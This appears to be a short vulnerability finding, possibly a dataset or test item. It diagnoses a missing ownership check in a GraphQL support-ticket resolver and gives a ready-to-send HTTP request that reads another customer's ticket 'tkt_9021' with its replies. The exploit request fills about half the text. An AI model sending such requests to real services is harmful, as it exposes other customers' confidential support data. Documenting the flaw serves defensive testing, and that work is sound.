diagnosis: The UserSupportTicket resolver retrieves customer support tickets and conversation threads by ticketID without verifying that the ticket was opened by the authenticated customer. Customers can view confidential customer support tickets, incident reports, and support agent messages of other accounts.
exploit_request:
POST /graphql HTTP/1.1
Host: help.saasplatform.com
Authorization: Bearer customer_jwt_771
Content-Type: application/json

{"query": "query { userSupportTicket(ticketId: \"tkt_9021\") { id subject description replies { message author } } }"}
